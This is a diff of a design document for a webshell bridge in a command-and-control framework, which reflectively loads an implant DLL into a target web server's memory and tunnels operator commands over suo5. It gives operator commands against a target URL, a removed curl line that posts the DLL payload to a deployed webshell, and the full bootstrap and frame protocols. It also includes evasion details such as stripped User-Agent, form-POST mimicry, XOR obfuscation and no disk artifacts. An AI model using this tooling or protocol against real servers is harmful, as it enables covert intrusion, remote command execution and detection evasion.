@@ -5,7 +5,7 @@
 WebShell Bridge enables IoM to operate through webshells (JSP/PHP/ASPX) using a memory channel architecture. The bridge DLL is loaded into the web server process memory, and the webshell calls DLL exports directly via function pointers — no TCP ports opened on the target.
 
 - **Product layer**: Server sees a `CustomPipeline(type="webshell")`. Operators interact via `webshell new/start/stop/delete` commands.
-- **Implementation layer**: Bridge binary runs on the operator machine, sending HTTP requests to the webshell with `X-Stage` headers.
+- **Implementation layer**: `WebShellPipeline` in the listener process handles DLL bootstrap via HTTP and establishes a persistent suo5 data channel.
 - **Transport layer**: The webshell loads the DLL, resolves exports, and calls `bridge_init`/`bridge_process` directly. Pure memory channel.
 
 ## Architecture
@@ -23,19 +23,26 @@ Product Layer (operator sees)
     Session appears like any other implant session
 
 
-Bridge Binary (server/cmd/webshell-bridge/)
-─────────────────────────────────────────
-  Runs on operator machine, connects to Server via ListenerRPC (mTLS)
+Listener Process (WebShellPipeline)
+────────────────────────────────────
+  Runs inside the listener, connects to Server via ListenerRPC (mTLS)
 
-  ┌─ HTTP transport ───────────────────────────────────────┐
-  │  HTTP POST with X-Stage headers to webshell URL        │
-  │  Raw protobuf over HTTP body (no malefic framing)      │
-  └────────────────────────────────────────────────────────┘
+  ┌─ Bootstrap (HTTP POST) ──────────────────────────────────┐
+  │  Body envelope: [1B stage][4B sid LE][1B tok_len][tok][…] │
+  │  Optional XOR obfuscation (key = sha256(token)[:16])     │
+  │  OPSEC: no User-Agent, Content-Type mimics form POST     │
+  └──────────────────────────────────────────────────────────┘
 
-  ┌─ spite/session adapter ────────────────────────────────┐
-  │  SpiteStream ↔ HTTP request/response translation       │
-  │  Session registration, checkin, task routing            │
-  └────────────────────────────────────────────────────────┘
+  ┌─ Data channel (suo5 full-duplex) ────────────────────────┐
+  │  proxyclient/suo5 → net.Conn                             │
+  │  TLV frames: [0xd1][4B sid][4B len][spite bytes][0xd2]   │
+  │  Bidirectional streaming over persistent connection       │
+  └──────────────────────────────────────────────────────────┘
+
+  ┌─ Forward integration ────────────────────────────────────┐
+  │  SpiteStream ↔ TLV frame translation                     │
+  │  Session registration, checkin, task routing              │
+  └──────────────────────────────────────────────────────────┘
 
 
 Target Web Server Process
@@ -43,7 +50,7 @@ Target Web Server Process
   WebShell (JSP/PHP/ASPX)
     - Bridge DLL loading (ReflectiveLoader)
     - Export resolution (bridge_init, bridge_process)
-    - X-Stage: spite → call bridge_process() → return response
+    - TLV frames → call bridge_process() → return TLV response
     - No port opened, no TCP loopback
 
   Bridge Runtime DLL (in web server process memory)
@@ -63,14 +70,13 @@ Target Web Server Process
 ```
 Client exec("whoami")
   → Server (SpiteStream)
-    → Bridge binary (HTTP POST X-Stage: spite)
-      → WebShell (calls bridge_process via function pointer)
-        → DLL module runtime
-          → exec("whoami") → "root"
-        → Spite response returned from bridge_process
-      → HTTP response body
-    → Bridge binary → SpiteStream.Send(response)
-  → Server → Client displays "root"
+    → WebShellPipeline handler (receives SpiteRequest)
+      → writeFrame: TLV pack → suo5 conn
+        → WebShell (calls bridge_process via function pointer)
+          → DLL module runtime → exec("whoami") → "root"
+        → TLV response via suo5 conn
+      → readLoop: TLV unpack → Forwarders.Send(SpiteResponse)
+    → Server → Client displays "root"
 ```
 
 ## Usage
@@ -79,44 +85,17 @@ Client exec("whoami")
 
 Deploy the suo5 webshell (JSP/PHP/ASPX) to the target web server.
 
-### 2. Build and run bridge binary
-
-```bash
-go build -o webshell-bridge ./server/cmd/webshell-bridge/
-
-webshell-bridge \
-  --auth listener.auth \
-  --url http://target.com/suo5.aspx \
-  --listener my-listener \
-  --token CHANGE_ME_RANDOM_TOKEN \
-  --dll bridge.dll
-```
-
-The `--token` must match the `STAGE_TOKEN` constant in the webshell. Use the full HTTP(S) URL of the deployed webshell.
-
-The `--dll` flag enables auto-loading: when the pipeline starts, the bridge automatically delivers the DLL to the webshell via `X-Stage: load` if it is not already loaded. If `--dll` is omitted, you must load the DLL manually (see below).
-
-At startup the bridge registers the listener, opens `JobStream`, and waits for pipeline control messages.
-
-### 3. Register and start the pipeline from Client/TUI
+### 2. Register and start the pipeline
 
 ```
-webshell new --listener my-listener
+webshell new --listener my-listener --suo5 suo5://target/bridge.jsp --token SECRET --dll /path/to/bridge.dll
 ```
 
-The bridge receives the start event, auto-loads the DLL (if `--dll` was provided), establishes the session, and the operator can interact immediately.
+The optional `--token` must match the `STAGE_TOKEN` constant in the webshell if set. Use the suo5 URL scheme (`suo5://` or `suo5s://` for HTTPS).
 
-**Manual DLL loading** (only needed if `--dll` is not set):
+The `--dll` flag enables auto-loading: when the pipeline starts, the bridge automatically delivers the DLL to the webshell if it is not already loaded.
 
-```bash
-curl -X POST \
-  -H "X-Stage: load" \
-  -H "X-Token: CHANGE_ME_RANDOM_TOKEN" \
-  --data-binary @bridge.dll \
-  http://target.com/suo5.aspx
-```
-
-### 4. Interact
+### 3. Interact
 
 ```
 use <session-id>
@@ -127,18 +106,33 @@ download /remote/file
 
 ## Protocol
 
-### HTTP Endpoints (X-Stage headers)
+### Bootstrap Envelope
 
-| Stage | Method | Description |
-|-------|--------|-------------|
-| `load` | POST | Load bridge DLL into memory (body = raw DLL bytes) |
-| `deps` | POST | Deliver dependency file (e.g., jna.jar) with `X-Dep-Name` header |
-| `status` | POST | Check if DLL is loaded (returns JSON `{"ready":true,...}` or legacy `LOADED`/`NOT_LOADED`) |
-| `init` | POST | Get Register data from `bridge_init()` (returns `[4B sessionID LE][Register protobuf]`) |
-| `spite` | POST | Process Spites via `bridge_process()` (body/response = serialized `Spites` protobuf) |
-| `stream` | POST | Long-lived response stream (length-prefixed frames, falls back to `spite` polling if unsupported) |
+Bootstrap requests use HTTP POST with `Content-Type: application/x-www-form-urlencoded` and no `User-Agent` header. The envelope is sent in plaintext; authentication is via the token field in the envelope header.
 
-All stage requests require `X-Token` header matching `STAGE_TOKEN`.
+**Envelope format (before optional XOR):** `[1B stage][4B sessionID LE][1B token_len][token bytes][payload...]`
+
+| Stage byte | Name | Payload | Response |
+|-----------|------|---------|----------|
+| `0x01` | load | Raw DLL bytes | `OK:memory` or error string |
+| `0x02` | status | (empty) | JSON `{"ready":true,...}` or legacy `LOADED`/`NOT_LOADED` |
+| `0x03` | init | (empty) | `[4B sessionID LE][Register protobuf]` |
+| `0x06` | deps | `[1B dep_name_len][dep_name][file bytes]` | `OK:<path>` or error string |
+
+Token validation uses HMAC-SHA256 for secrets longer than 32 characters (rotates every 30s with +/-30s tolerance). Short secrets use static comparison.
+
+### Data Channel TLV Frame
+
+After bootstrap, a persistent suo5 connection carries bidirectional TLV frames:
+
+```
+[1B 0xd1][4B sessionID LE][4B payload_len LE][payload bytes][1B 0xd2]
+```
+
+- `0xd1` / `0xd2` are start/end delimiters matching malefic wire format
+- Payload is serialized `Spites` protobuf
+- Maximum frame size: 10 MiB
+- Future: payload will be encrypted (outer streaming encryption layer)
 
 ### DLL Export Interface
 
@@ -168,15 +162,25 @@ int __stdcall bridge_destroy();
 
 The DLL must also export `ReflectiveLoader` for the loading phase. The webshell uses ReflectiveLoader to map the DLL, then resolves `bridge_init`/`bridge_process` from the mapped image's export table.
 
+## OPSEC Properties
+
+| Property | Status |
+|----------|--------|
+| Custom HTTP headers | None — no X-*, no custom cookies |
+| User-Agent | Empty (Go default stripped) |
+| Content-Type | `application/x-www-form-urlencoded` (common POST type) |
+| Bootstrap body | Plaintext envelope (token included for auth) |
+| Data channel | TLV-framed, ready for encryption layer |
+| Ports opened | None on target |
+| Disk artifacts | None (DLL is memory-only) |
+
 ## Key Files
 
 | Purpose | Path |
 |---------|------|
-| Bridge binary | `server/cmd/webshell-bridge/` |
-| Channel (HTTP) | `server/cmd/webshell-bridge/channel.go` |
-| Session management | `server/cmd/webshell-bridge/session.go` |
+| WebShell pipeline | `server/listener/webshell.go` |
+| Pipeline tests | `server/listener/webshell_test.go` |
 | Client commands | `client/command/pipeline/webshell.go` |
-| CustomPipeline (server) | `server/listener/custom.go` |
-| Webshell (ASPX) | `suo5-webshell/suo5.aspx` |
-| Webshell (PHP) | `suo5-webshell/suo5.php` |
-| Webshell (JSP) | `suo5-webshell/suo5.jsp` |
+| Webshell (ASPX) | `suo5-webshell/bridge.aspx` |
+| Webshell (PHP) | `suo5-webshell/bridge.php` |
+| Webshell (JSP) | `suo5-webshell/bridge.jsp` |
